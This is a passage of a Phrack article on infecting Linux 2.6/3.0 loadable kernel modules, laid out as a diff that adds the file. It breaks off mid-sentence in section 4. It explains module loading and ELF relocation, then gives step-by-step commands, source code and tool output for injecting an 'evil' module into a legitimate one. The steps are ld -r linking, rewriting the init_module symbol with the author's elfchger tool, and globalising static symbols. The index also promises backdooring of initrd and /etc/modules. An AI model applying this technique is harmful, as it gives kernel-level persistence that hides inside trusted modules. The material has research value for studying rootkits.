@@ -1,0 +1,2680 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x0b of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=----------------=[ Infecting loadable kernel modules ]=----------------=|
+|=-------------------=[ kernel versions 2.6.x/3.0.x ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------------------=[ by styx^ ]=-----------------------------=|
+|=-----------------------=[ the.styx@gmail.com ]=------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+---[ Index
+
+
+    1 - Introduction
+
+    2 - Kernel 2.4.x method
+        2.1 - First try
+        2.2 - LKM loading explanations
+        2.3 - The relocation process
+
+    3 - Playing with loadable kernel modules on 2.6.x/3.0.x
+        3.1 - A first example of code injection
+
+    4 - Real World: Is it so simple?
+        4.1 - Static functions
+            4.1.1 - Local symbol
+            4.1.2 - Changing symbol bind
+            4.1.3 - Try again
+        4.2 - Static __init functions
+        4.3 - What about cleanup_module
+
+    5 - Real life example
+        5.1 - Inject a kernel module in /etc/modules
+        5.2 - Backdooring initrd
+
+    6 - What about other systems?
+        6.1 - Solaris
+            6.1.1 - A basic example
+            6.1.2 - Playing with OS modules
+            6.1.3 - Keeping it stealthy
+        6.2 - *BSD
+            6.2.1 - FreeBSD - NetBSD - OpenBSD
+
+    7 - Conclusion
+
+    8 - References
+
+    9 - Codes
+        9.1 - Elfstrchange
+        9.2 - elfstrchange.patch
+
+
+---[ 1 - Introduction
+
+
+In Phrack #61 [1] truff introduced a new method to infect a loadable kernel
+module on Linux kernel x86 2.4.x series.  Actually this method is currently
+not compatible with the Linux kernel 2.6.x/3.0.x series due to the many
+changes made in kernel internals.  As a result, in order to infect a kernel
+module, changing the name of symbols in .strtab section is not enough
+anymore; the task has become a little bit trickier.  In this article it
+will be shown how to infect a kernel module on Linux kernel x86 2.6.*/3.0.x
+series. All the methods discussed here have been tested on kernel version
+2.6.35, 2.6.38 and 3.0.0 on Ubuntu 10.10, 11.04 and 11.10 and on kernel
+version 2.6.18-238 on CentOS 5.6.
+
+The proposed method has been tested only on 32-bit architectures: a 64-bit
+adaptation is left as an exercise to the reader.  Finally, I want to
+clarify that the proposed paper is not innovative, but is only an update of
+truff's paper.
+
+
+---[ 2 - Kernel 2.4.x method
+
+
+---[ 2.1 - First try
+
+
+With the help of a simple example it will be explained why truff's method
+is no longer valid: we are using the "elfstrchange" tool provided in his
+paper. First, let's write a simple testing kernel module:
+
+/****************** orig.c ***********************************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+int evil(void) {
+
+    printk(KERN_ALERT "Init Inject!");
+
+    return 0;
+
+}
+
+int init(void) {
+
+    printk(KERN_ALERT "Init Original!");
+
+    return 0;
+}
+
+void clean(void) {
+
+    printk(KERN_ALERT "Exit Original!");
+
+    return;
+}
+
+module_init(init);
+module_exit(clean);
+/****************** EOF **************************************************/
+
+The module_init macro is used to register the initialization function of
+the loadable kernel module: in other words, the function which is called
+when the module is loaded, is the init() function.  Reciprocally the
+module_exit macro is used to register the termination function of the LKM
+which means that in our example clean() will be invoked when the module is
+unloaded. These macros can be seen as the constructor/destructor
+declaration of the LKM object. A more exhaustive explanation can be found
+in section 2.2.
+
+Below is the associated Makefile:
+
+/****************** Makefile *********************************************/
+obj-m += orig.o
+
+KDIR    := /lib/modules/$(shell uname -r)/build
+PWD    := $(shell pwd)
+
+default:
+    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
+
+clean:
+    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) clean
+/****************** EOF **************************************************/
+
+Now the module can be compiled and the testing can start:
+
+$ make
+...
+
+Truff noticed that altering the symbol names located in the .strtab section
+was enough to fool the resolution mechanism of kernel v2.4. Indeed the
+obj_find_symbol() function of modutils was looking for a specific symbol
+("init_module") using its name [1]:
+
+/*************************************************************************/
+module->init = obj_symbol_final_value(f, obj_find_symbol(f,
+                                                     SPFX "init_module"));
+module->cleanup = obj_symbol_final_value(f, obj_find_symbol(f,
+                                                  SPFX "cleanup_module"));
+/*************************************************************************/
+
+Let's have a look at the ELF symbol table of orig.ko:
+
+$ objdump -t orig.ko
+
+orig.ko:     file format elf32-i386
+
+SYMBOL TABLE:
+
+...
+
+00000040 g     F .text	0000001b evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000020 g     F .text	0000001b init_module
+00000000 g     F .text	00000019 clean
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000020 g     F .text	0000001b init
+
+We want to setup evil() as the initialization function instead of init().
+Truff was doing it in two steps:
+
+    1. renaming init to dumm
+    2. renaming evil to init
+
+This can easily be performed using his tool, "elfstrchange", slightly
+bug-patched (see section 9):
+
+$ ./elfstrchange orig.ko init dumm
+[+] Symbol init located at 0xa91
+[+] .strtab entry overwritten with dumm
+
+$ ./elfstrchange orig.ko evil init
+[+] Symbol evil located at 0xa4f
+[+] .strtab entry overwritten with init
+
+$ objdump -t orig.ko
+
+...
+
+00000040 g     F .text	0000001b init          <-- evil()
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000020 g     F .text	0000001b init_module
+00000000 g     F .text	00000019 clean
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000020 g     F .text	0000001b dumm          <-- init()
+
+Now we're loading the module:
+
+$ sudo insmod orig.ko
+$ dmesg |tail
+...
+
+[ 2438.317831] Init Original!
+
+As we can see the init() function is still invoked. Applying the same
+method with "init_module" instead of init doesn't work either. In the next
+subsection the reasons of this behaviour are explained.
+
+
+---[ 2.2 LKM loading explanations
+
+
+In the above subsection I briefly mentioned the module_init and
+module_exit macros. Now let's analyze them.  In kernel v2.4 the entry and
+exit functions of the LKMs were init_module() and cleanup_module(),
+respectively.  Nowadays, with kernel v2.6, the programmer can choose the
+name he prefers for these functions using the module_init() and
+module_exit() macros. These macros are defined in "include/linux/init.h"
+[3]:
+
+
+/*************************************************************************/
+#ifndef MODULE
+
+[...]
+
+#else /* MODULE */
+
+[...]
+
+/* Each module must use one module_init(). */
+#define module_init(initfn)                                     \
+        static inline initcall_t __inittest(void)               \
+        { return initfn; }                                      \
+        int init_module(void) __attribute__((alias(#initfn)));
+
+/* This is only required if you want to be unloadable. */
+#define module_exit(exitfn)                                     \
+        static inline exitcall_t __exittest(void)               \
+        { return exitfn; }                                      \
+        void cleanup_module(void) __attribute__((alias(#exitfn)));
+
+[...]
+
+#endif /*MODULE*/
+/*************************************************************************/
+
+
+We are only interested in the "loadable module" case, that is when MODULE
+is defined. As you can see, init_module is always declared as an alias of
+initfn, the argument of the module_init macro. As a result, the compiler
+will always produce identical symbols in the relocatable object: one for
+initfn and one for "module_init". The same rule applies for the termination
+function, if the unloading mechanism is compiled in the kernel (that is if
+CONFIG_MODULE_UNLOAD is defined).
+
+When a module is compiled, first the compiler creates an object file for
+each source file, then it generates an additional generic source file,
+compiles it and finally links all the relocatable objects together.
+
+In the case of orig.ko, orig.mod.c is the file generated and compiled as
+orig.mod.o. The orig.mod.c follows:
+
+/*************************************************************************/
+#include <linux/module.h>
+#include <linux/vermagic.h>
+#include <linux/compiler.h>
+
+MODULE_INFO(vermagic, VERMAGIC_STRING);
+
+struct module __this_module
+__attribute__((section(".gnu.linkonce.this_module"))) = {
+ .name = KBUILD_MODNAME,
+ .init = init_module,
+#ifdef CONFIG_MODULE_UNLOAD
+ .exit = cleanup_module,
+#endif
+ .arch = MODULE_ARCH_INIT,
+};
+
+static const struct modversion_info ____versions[]
+__used
+__attribute__((section("__versions"))) = {
+	{ 0x4d5503c4, "module_layout" },
+	{ 0x50eedeb8, "printk" },
+	{ 0xb4390f9a, "mcount" },
+};
+
+static const char __module_depends[]
+__used
+__attribute__((section(".modinfo"))) =
+"depends=";
+
+
+MODULE_INFO(srcversion, "EE786261CA9F9F457DF0EB5");
+/*************************************************************************/
+
+This file declares and partially initializes a struct module which will be
+stored in the ".gnu.linkonce.this_module" section of the object file. The
+module struct is defined in "include/linux/module.h":
+
+/*************************************************************************/
+struct module
+{
+	[...]
+
+	/* Unique handle for this module */
+	char name[MODULE_NAME_LEN];
+
+	[...]
+
+	/* Startup function. */
+	int (*init)(void);
+
+	[...]
+
+	/* Destruction function. */
+	void (*exit)(void);
+
+	[...]
+};
+/*************************************************************************/
+
+So when the compiler auto-generates the C file, it always makes the .init
+and .exit fields of the struct pointing to the function "init_module" and
+"cleanup_module". But the corresponding functions are not declared in this
+C file so they are assumed external and their corresponding symbols are
+declared undefined (*UND*):
+
+$ objdump -t orig.mod.o
+
+orig.mod.o:     file format elf32-i386
+
+SYMBOL TABLE:
+[...]
+00000000         *UND*	00000000 init_module
+00000000         *UND*	00000000 cleanup_module
+
+When the linking with the other objects is performed, the compiler is then
+able to solve this issue thanks to the aliasing performed by the
+module_init() and module_exit() macros.
+
+$ objdump -t orig.ko
+
+00000000 g     F .text	0000001b evil
+00000000 g     O .gnu.linkonce.this_module	00000184 __this_module
+00000040 g     F .text	00000019 cleanup_module
+00000020 g     F .text	0000001b init_module
+00000040 g     F .text	00000019 clean
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000020 g     F .text	0000001b init
+
+The aliasing can be seen as a smart trick to allow the compiler to declare
+and fill the __this_module object without too much trouble. This object is
+essential for the loading of the module in the v2.6.x/3.0.x kernels.
+
+To load the LKM, a userland tool (insmod/modprobe/etc.) calls the
+sys_init_module() syscall which is defined in "kernel/module.c":
+
+/*************************************************************************/
+SYSCALL_DEFINE3(init_module, void __user *, umod,
+               unsigned long, len, const char __user *, uargs)
+{
+        struct module *mod;
+        int ret = 0;
+
+        ...
+
+        /* Do all the hard work */
+        mod = load_module(umod, len, uargs);
+
+        ...
+
+        /* Start the module */
+        if (mod->init != NULL)
+                ret = do_one_initcall(mod->init);
+        ...
+}
+/*************************************************************************/
+
+The load_module() function returns a pointer to a "struct module" object
+when the LKM is loaded in memory. As stated in the source code,
+load_module() handles the main tasks associated with the loading and as
+such is neither easy to follow nor to explain in a few sentences. However
+there are two important things that you should know:
+
+    - load_module() is responsible for the ELF relocations
+    - the mod->init is holding the relocated value stored in __this_module
+
+Note: Because __this_module is holding initialized function pointers (the
+address of init() and clean() in our example), there has to be a relocation
+at some point.
+
+After the relocation is performed, mod->init() refers to the kernel mapping
+of init_module() and can be called through do_one_initcall() which is
+defined in "init/main.c":
+
+/*************************************************************************/
+int __init_or_module do_one_initcall(initcall_t fn)
+{
+        int count = preempt_count();
+        int ret;
+
+        if (initcall_debug)
+                ret = do_one_initcall_debug(fn);   <-- init_module() may be
+        else                                           called here
+                ret = fn();                        <-- or it may be called
+                                                       here
+        msgbuf[0] = 0;
+
+        ...
+
+        return ret;
+}
+/*************************************************************************/
+
+
+---[ 2.3 - The relocation process
+
+
+The relocation itself is handled by the load_module() function and without
+any surprise the existence of the corresponding entries can be found in the
+binary:
+
+$ objdump -r orig.ko
+
+./orig.ko:     file format elf32-i386
+
+    ...
+
+RELOCATION RECORDS FOR [.gnu.linkonce.this_module]:
+OFFSET   TYPE              VALUE
+000000d4 R_386_32          init_module
+00000174 R_386_32          cleanup_module
+
+This means that the relocation has to patch two 32-bit addresses (because
+type == R_386_32) located at:
+
+- (&.gnu.linkonce.this_module = &__this_module) + 0xd4   [patch #1]
+- (&.gnu.linkonce.this_module = &__this_module) + 0x174  [patch #2]
+
+A relocation entry (in a 32-bit environment) is an Elf32_Rel object and
+is defined in "/usr/include/elf.h":
+
+/*************************************************************************/
+typedef struct
+{
+  Elf32_Addr    r_offset;               /* Address */
+  Elf32_Word    r_info;                 /* Relocation type and symbol index
+*/
+} Elf32_Rel;
+
+#define ELF32_R_SYM(val)                ((val) >> 8)
+/*************************************************************************/
+
+The important thing to remember is that the symbol is located using
+ELF32_R_SYM() which provides an index in the table of symbols, the .symtab
+section.
+
+This can be easily seen:
+
+$ readelf -S ./orig.ko  | grep gnu.linkonce
+ [10] .gnu.linkonce.thi PROGBITS    00000000 000240 000184 00  WA  0   0 32
+ [11] .rel.gnu.linkonce REL         00000000 0007f8 000010 08     16  10  4
+
+The relocation section associated with section 10 is thus section 11.
+
+$ readelf -x 11 orig.ko
+
+Hex dump of section '.rel.gnu.linkonce.this_module':
+  0x00000000 d4000000 01160000 74010000 01150000 ........t.......
+
+So ELF32_R_SYM() is returning 0x16 (=22) for the first relocation and 0x1b
+(=21) for the second one. Now let's see the table of symbols:
+
+$ readelf -s .orig.ko
+
+Symbol table '.symtab' contains 33 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
+
+    ...
+
+    21: 00000040    25 FUNC    GLOBAL DEFAULT    2 cleanup_module
+    22: 00000020    27 FUNC    GLOBAL DEFAULT    2 init_module
+
+    ...
+
+This is a perfect match. So when the LKM is loaded:
+
+    - The kernel performs a symbol resolution and the corresponding symbols
+      are updated with a new value. At his point init_module and
+      cleanup_module are holding kernel space addresses.
+
+    - The kernel performs the required relocations using the index in the
+      table of symbols to know how to patch. When the relocation is
+      performed __this_module has been patched twice.
+
+At this point it should be clear that the address value of the init_module
+symbol has to be modified if we want to call evil() instead of init().
+
+
+---[ 3 - Playing with loadable kernel modules on 2.6.x/3.0.x
+
+
+As pointed out above, the address of the init_module symbol has to be
+modified in order to invoke the evil() function at loading time. Since the
+LKM is a relocatable object, this address is calculated using the offset
+(or relative address) stored in the st_value field of the Elf32_Sym
+structure [2], defined in "/usr/include/elf.h":
+
+/*************************************************************************/
+typedef struct
+{
+  Elf32_Word	st_name;	/* Symbol name (string tbl index) */
+  Elf32_Addr	st_value;	/* Symbol value */
+  Elf32_Word	st_size;	/* Symbol size */
+  unsigned char	st_info;	/* Symbol type and binding */
+  unsigned char	st_other;	/* Symbol visibility */
+  Elf32_Section	st_shndx;	/* Section index */
+} Elf32_Sym;
+/*************************************************************************/
+
+$ objdump -t orig.ko
+
+orig.ko:     file format elf32-i386
+
+SYMBOL TABLE:
+
+...
+
+00000040 g     F .text	0000001b evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000020 g     F .text	0000001b init_module
+00000000 g     F .text	00000019 clean
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000020 g     F .text	0000001b init
+
+The objdump output shows that:
+
+- the relative address of evil() is 0x00000040;
+- the relative address of init_module() is 0x00000020;
+- the relative address of init() is 0x00000020;
+
+Altering these offsets is enough to have evil() being called instead of
+init_module() because the relocation process in the kernel will produce the
+corresponding "poisoned" virtual address.
+
+The orig.ko has to look like this:
+
+00000040 g     F .text	0000001b evil
+...
+00000040 g     F .text	0000001b init_module
+
+To do so, we can use my 'elfchger' script in order to modify the ELF file.
+The code structure is the same as truff's one, with some minor changes.
+The script takes the following input parameters:
+
+./elfchger -s [symbol] -v [value] <module_name>
+
+Where [value] represents the new relative address of the [symbol]
+(init_module in our case) in <module_name>:
+
+Let's apply it to our example:
+
+$ ./elfchger -s init_module -v 00000040 orig.ko
+[+] Opening orig.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0x77c
+[+] Finding ".strtab" section...
+	>> Found at 0x7a4
+[+] Getting symbol' infos:
+	>> Symbol found at 0x99c
+	>> Index in symbol table: 0x16
+[+] Replacing 0x00000020 with 0x00000040... done!
+
+The ELF file is now changed:
+
+$ objdump -t orig.ko
+
+orig.ko:     file format elf32-i386
+
+SYMBOL TABLE:
+...
+
+00000040 g     F .text	0000001b evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000040 g     F .text	0000001b init_module
+00000000 g     F .text	00000019 clean
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000020 g     F .text	0000001b init
+
+Let's load the module:
+
+$ sudo insmod orig.ko
+
+$ dmesg | tail
+...
+
+[ 5733.929286] Init Inject!
+
+$
+
+As expected the evil() function is invoked instead of init() when the
+module is loaded.
+
+
+---[ 3.1 A first example of code injection
+
+The next step is the injection of external code inside the original module
+(orig.ko). A new kernel module (evil.ko) will be injected into orig.ko.
+We will use both orig.c and evil.c source codes:
+
+/***************************** orig.c ************************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+int init_module(void) {
+
+    printk(KERN_ALERT "Init Original!");
+
+    return 0;
+}
+
+void clean(void) {
+
+    printk(KERN_ALERT "Exit Original!");
+
+    return;
+}
+
+module_init(init);
+module_exit(clean);
+/******************************** EOF ************************************/
+
+/***************************** evil.c ************************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+int evil(void) {
+
+    printk(KERN_ALERT "Init Inject!");
+
+    return 0;
+}
+/******************************** EOF ************************************/
+
+Once the two modules orig.ko and evil.ko are compiled, they can be linked
+together using the 'ld -r' command (as explained by truff) because they are
+both relocatable objects.
+
+$ ld -r orig.ko evil.ko -o new.ko
+$ objdump -t new.ko
+
+new.ko:     file format elf32-i386
+
+SYMBOL TABLE:
+...
+
+00000040 g     F .text	0000001b evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000020 g     F .text	0000001b init_module
+00000000 g     F .text	00000019 clean
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000020 g     F .text	0000001b init
+
+The evil() function has now been linked into the new.ko module. The next
+step is to make init_module() (defined in orig.ko) an alias of evil()
+(defined in evil.ko). It can be done easily using ./elfchger:
+
+$ ./elfchger -f init_module -v 00000040 new.ko
+[+] Opening new.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0x954
+[+] Finding ".strtab" section...
+	>> Found at 0x97c
+[+] Getting symbol' infos:
+	>> Symbol found at 0xbe4
+	>> Index in symbol table: 0x1d
+[+] Replacing 0x00000020 with 0x00000040... done!
+
+At this point the module can be renamed and loaded:
+
+$ mv new.ko orig.ko
+$ sudo insmod orig.ko
+$ dmesg | tail
+...
+[ 6791.920363] Init Inject!
+
+And the magic occurs :)
+
+As already explained by truff, if we want the original module to work
+properly, we need to call its initialization function. This can be done
+using an imported symbol which will be fixed at linking time.  The init()
+function is declared as extern: this means that it will be resolved at
+linking time. We use the following code:
+
+/****************************** evil.c ***********************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+extern int init();
+
+int evil(void) {
+
+    init();
+    printk(KERN_ALERT "Init Inject!");
+
+    /* do something */
+
+    return 0;
+}
+/******************************** EOF ************************************/
+
+And it works:
+
+$ dmesg | tail
+...
+[ 7910.392244] Init Original!
+[ 7910.392248] Init Inject!
+
+
+---[ 4 - Real World: Is it so simple?
+
+
+In this section it will be shown why the method described above when used
+in real life may not work. In fact the example modules were overly
+simplified for a better understanding of the basic idea of module
+infection.
+
+
+---[ 4.1 - Static functions
+
+
+The majority of Linux system modules are a little bit different from those
+used above. Here is a more accurate example:
+
+/***************************** orig.c ************************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+static int init(void) {
+
+    printk(KERN_ALERT "Init Original!");
+
+    return 0;
+}
+
+static void clean(void) {
+
+    printk(KERN_ALERT "Exit Original!");
+
+    return;
+}
+
+module_init(init);
+module_exit(clean);
+/******************************** EOF ************************************/
+
+Let's try to use our method to inject the old evil code inside this new
+orig module.
+
+$ ld -r orig.ko evil.ko -o new.ko
+$ sudo insmod new.ko
+insmod: error inserting 'new.ko': -1 Unknown symbol in module
+
+What? More information is needed:
+
+$ dmesg | tail
+...
+[ 2737.539906] orig: Unknown symbol init (err 0)
+
+The unknown symbol appears to be init. To understand the reason why init is
+"unknown" let's have a look at the symbol table of new.ko:
+
+$ objdump -t new.ko
+
+...
+
+SYMBOL TABLE:
+...
+
+00000000 l     F .text	00000019 clean
+00000020 l     F .text	0000001b init
+
+...
+
+00000040 g     F .text	00000020 evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000020 g     F .text	0000001b init_module
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000000         *UND*	00000000 init
+
+This output shows that there are now two "init" symbols, one of them not
+being defined (*UND*). This means that the linker does not perform
+correctly the linking between the init functions in orig.ko and evil.ko. As
+a result, when the module is loaded, the kernel tries to find the init
+symbol, but since it is not defined anywhere it fails to do so and the
+module is not loaded.
+
+
+---[ 4.1.1 - Local symbol
+
+The 'readelf' tool can give us more insight:
+
+$ readelf -s orig.ko
+
+Symbol table '.symtab' contains 26 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+    ...
+    14: 00000020    27 FUNC    LOCAL  DEFAULT    2 init
+    ...
+
+To summarize, we know about the init symbol that:
+
+- its relative address is 0x00000020;
+- its type is a function;
+- its binding is local;
+
+The symbol binding is now local (while it was previously global) since the
+init function is now declared 'static' in orig.c. This has the effect to
+reduce its scope to the file in which it is declared. For this reason the
+symbol was not properly resolved by the linker. We need to do something in
+order to change the scope of init, otherwise the injection won't work.
+
+
+---[ 4.1.2 - Changing symbol binding
+
+
+It's possible to change a symbol binding using the 'objcopy' tool. In fact
+the '--globalize-symbol' option can be used to give global scoping to the
+specified symbol:
+
+$ objcopy --globalize-symbol=init ./orig.ko orig2.ko
+
+But if for some reason, objcopy is not present, the tool that I wrote can
+also globalize a particular symbol modifying all the necessary fields
+inside the ELF file.
+
+Each symbol table entry in the .symtab section is defined as follows [2]:
+
+/******************************** EOF ************************************/
+typedef struct
+{
+  Elf32_Word	st_name;	/* Symbol name (string tbl index) */
+  Elf32_Addr	st_value;	/* Symbol value */
+  Elf32_Word	st_size;	/* Symbol size */
+  unsigned char	st_info;	/* Symbol type and binding */
+  unsigned char	st_other;	/* Symbol visibility */
+  Elf32_Section	st_shndx;	/* Section index */
+} Elf32_Sym;
+/******************************** EOF ************************************/
+
+First, it's necessary to find in the ELF file the symbol we are looking for
+(init) and check if it has a global or a local binding. The function
+ElfGetSymbolByName() searches the offset at which init symbol is located in
+the .symtab and it fills the corresponding "Elf32_Sym sym" structure.
+Next, the binding type must be checked by looking at the st_info field.
+Passing sym.st_info to the macro ELF32_ST_BIND() defined in "<elf.h>",
+returns the expected binding value.
+
+If the symbol has a local binding, these steps have to be performed:
+
+1. Reorder the symbols: the symbol we are interested in must be placed
+   among the global symbols inside the .symtab section. We'll see later why
+   this step is mandatory. We need to move the init symbol from:
+
+   $ readelf -s orig.ko
+
+   Symbol table '.symtab' contains 26 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
+     1: 00000000     0 SECTION LOCAL  DEFAULT    1
+     2: 00000000     0 SECTION LOCAL  DEFAULT    2
+     3: 00000000     0 SECTION LOCAL  DEFAULT    4
+     4: 00000000     0 SECTION LOCAL  DEFAULT    5
+     5: 00000000     0 SECTION LOCAL  DEFAULT    6
+     6: 00000000     0 SECTION LOCAL  DEFAULT    8
+     7: 00000000     0 SECTION LOCAL  DEFAULT    9
+     8: 00000000     0 SECTION LOCAL  DEFAULT   10
+     9: 00000000     0 SECTION LOCAL  DEFAULT   12
+    10: 00000000     0 SECTION LOCAL  DEFAULT   13
+    11: 00000000     0 SECTION LOCAL  DEFAULT   14
+    12: 00000000     0 FILE    LOCAL  DEFAULT  ABS orig.c
+    13: 00000000    25 FUNC    LOCAL  DEFAULT    2 clean
+
+    14: 00000020    27 FUNC    LOCAL  DEFAULT    2 init       <-----
+
+    15: 00000000    12 OBJECT  LOCAL  DEFAULT    5 __mod_license6
+    16: 00000000     0 FILE    LOCAL  DEFAULT  ABS orig.mod.c
+    17: 00000020    35 OBJECT  LOCAL  DEFAULT    5 __mod_srcversion31
+    18: 00000043     9 OBJECT  LOCAL  DEFAULT    5 __module_depends
+    19: 00000000   192 OBJECT  LOCAL  DEFAULT    8 ____versions
+    20: 00000060    59 OBJECT  LOCAL  DEFAULT    5 __mod_vermagic5
+    21: 00000000   372 OBJECT  GLOBAL DEFAULT   10 __this_module
+    22: 00000000    25 FUNC    GLOBAL DEFAULT    2 cleanup_module
+    23: 00000020    27 FUNC    GLOBAL DEFAULT    2 init_module
+    24: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND mcount
+    25: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND printk
+
+   To:
+
+   Symbol table '.symtab' contains 26 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
+     1: 00000000     0 SECTION LOCAL  DEFAULT    1
+     2: 00000000     0 SECTION LOCAL  DEFAULT    2
+     3: 00000000     0 SECTION LOCAL  DEFAULT    4
+     4: 00000000     0 SECTION LOCAL  DEFAULT    5
+     5: 00000000     0 SECTION LOCAL  DEFAULT    6
+     6: 00000000     0 SECTION LOCAL  DEFAULT    8
+     7: 00000000     0 SECTION LOCAL  DEFAULT    9
+     8: 00000000     0 SECTION LOCAL  DEFAULT   10
+     9: 00000000     0 SECTION LOCAL  DEFAULT   12
+    10: 00000000     0 SECTION LOCAL  DEFAULT   13
+    11: 00000000     0 SECTION LOCAL  DEFAULT   14
+    12: 00000000     0 FILE    LOCAL  DEFAULT  ABS orig.c
+    13: 00000000    25 FUNC    LOCAL  DEFAULT    2 clean
+    14: 00000000    12 OBJECT  LOCAL  DEFAULT    5 __mod_license6
+    15: 00000000     0 FILE    LOCAL  DEFAULT  ABS orig.mod.c
+    16: 00000020    35 OBJECT  LOCAL  DEFAULT    5 __mod_srcversion31
+    17: 00000043     9 OBJECT  LOCAL  DEFAULT    5 __module_depends
+    18: 00000000   192 OBJECT  LOCAL  DEFAULT    8 ____versions
+    19: 00000060    59 OBJECT  LOCAL  DEFAULT    5 __mod_vermagic5
+
+    20: 00000020    27 FUNC    GLOBAL DEFAULT    2 init       <-----
+
+    21: 00000000   372 OBJECT  GLOBAL DEFAULT   10 __this_module
+    22: 00000000    25 FUNC    GLOBAL DEFAULT    2 cleanup_module
+    23: 00000020    27 FUNC    GLOBAL DEFAULT    2 init_module
+    24: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND mcount
+    25: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND printk
+
+   This task is accomplished by the "ReorderSymbols()" function.
+
+2. Updating the information about the init symbol (i.e. its offset, index,
+   etc..) according to its new position inside the .symtab section.
+
+3. Changing the symbol binding from local to global by modifying the
+   st_info field using the ELF32_ST_INFO macro:
+
+   #define ELF32_ST_INFO(b, t)	(((b)<<4)+((t)&0xf))
+
+   Where 'b' is the symbol binding and 't' the symbol type.
+   The binding values are:
+
+   Name        Value
+   ====        =====
+   STB_LOCAL       0
+   STB_GLOBAL      1
+   STB_WEAK        2
+   STB_LOPROC     13
+   STB_HIPROC     15
+
+   Obviously, STB_GLOBAL has to be used for our purpose.
+
+   The type values are:
+
+   Name         Value
+   ====         =====
+   STT_NOTYPE       0
+   STT_OBJECT       1
+   STT_FUNC         2
+   STT_SECTION      3
+   STT_FILE         4
+   STT_LOPROC      13
+   STT_HIPROC      15
+
+   The STT_FUNC is the type value to specify functions.
+
+   So, the resulting macro will be:
+
+   ELF32_ST_INFO(STB_GLOBAL, STT_FUNC);
+
+   The init st_info field should then be set equal to the macro's result.
+
+4. Updating the symtab section header, defined as:
+
+   typedef struct {
+      Elf32_Word	sh_name;
+      Elf32_Word	sh_type;
+      Elf32_Word	sh_flags;
+      Elf32_Addr	sh_addr;
+      Elf32_Off		sh_offset;
+      Elf32_Word	sh_size;
+      Elf32_Word	sh_link;
+      Elf32_Word	sh_info;
+      Elf32_Word	sh_addralign;
+      Elf32_Word	sh_entsize;
+   } Elf32_Shdr;
+
+   The header can be output by the 'readelf -e' command:
+
+   $ readelf -e orig.ko
+
+   ELF Header:
+
+   ...
+
+   Section Headers:
+   [Nr] Name          Type     Addr     Off    Size   ES Flg Lk Inf Al
+   ...
+   [15] .shstrtab     STRTAB   00000000 00040c 0000ae 00      0   0  1
+   [16] .symtab       SYMTAB   00000000 0007dc 0001a0 10     17  21  4
+   [17] .strtab       STRTAB   00000000 00097c 0000a5 00      0   0  1
+
+   The value of the information (sh_info) field (reported as 'Inf')
+   depends on the section header type (sh_type):
+
+   sh_type      sh_link                        sh_info
+   =======      =======                        =======
+   SHT_DYNAMIC  The section header index of    0
+                the string table used by
+                entries in the section.
+   SHT_HASH     The section header index of    0
+                the symbol table to which the
+                hash table applies.
+   SHT_REL,     The section header index of    The section header index of
+   SHT_RELA     the associated symbol table.   the section to which the
+                                               relocation applies.
+   SHT_SYMTAB,  The section header index of    One greater than the symbol
+   SHT_DYNSYM   the associated string table.   table index of the last
+                                               local symbol (binding
+                                               STB_LOCAL).
+   other        SHN_UNDEF                      0
+
+   The sh_info must be updated according to the rules of the SHT_SYMTAB
+   type. In our example, its value will be 20 = 19 + 1 (remember that our
+   symbol will be placed after the "__mod_vermagic5" symbol, whose entry
+   number is 19). This is the reason why reorder the symbol list (step 1)
+   is a necessary step.
+
+All these tasks are accomplished by the tool I wrote by using this option:
+
+./elfchger -g [symbol] <module_name>
+
+Where [symbol] is the symbol name which binding value has to be modified.
+
+
+---[ 4.1.3 Try again
+
+
+At this point we can try another test, in which the developed tool will be
